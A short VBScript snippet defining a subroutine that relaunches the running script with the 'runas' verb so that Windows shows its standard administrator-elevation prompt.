Option Explicit

Sub EnsureElevatedPrivileges()
    If Not WScript.Arguments.Named.Exists("elevate") Then
        CreateObject("Shell.Application").ShellExecute WScript.FullName, """" & WScript.ScriptFullName & """ /elevate", "", "runas", 1
        WScript.Quit
    End If
End Sub

